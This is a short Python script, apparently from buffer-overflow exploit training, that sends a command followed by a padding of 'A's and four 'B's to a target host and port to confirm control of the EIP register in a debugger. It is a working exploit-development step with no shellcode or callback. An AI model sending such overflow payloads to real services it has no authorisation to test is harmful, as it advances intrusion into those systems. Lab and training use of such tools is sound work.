#!/usr/bin/python
import optparse, sys, socket

parser = optparse.OptionParser('Example: python eip_finder.py -t <target host> -p <target port> -c <command> -o <offset>')
parser.add_option('-t', dest='target', type='string', help='Enter a target host')
parser.add_option('-p', dest='port', type='int', help='Enter a target port')
parser.add_option('-c', dest='command', type='string', help='Enter a command')
parser.add_option('-o', dest='offset', type='int', help='Enter a target offset')
(options, args) = parser.parse_args()
target = options.target
port = options.port
command = options.command
offset = options.offset

if (target == None) | (port == None):
	print(parser.usage)
	exit(0)

print('\n----------------------------------EIP VERIFY------------------------------------')
print('                              Author: @rootshooter')
print('                                 Version: 1.0')
print('--------------------------------------------------------------------------------')


payload = "A" * offset + "B" * 4 

try:
	print("[+] Sending Payload")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target , port))
	s.send((command + payload))
	s.close()
	print("[+] Payload Sent")
	print("[+] Check debugger\n")
except:
	print("[-] ERROR: Check the debugger")
	sys.exit()
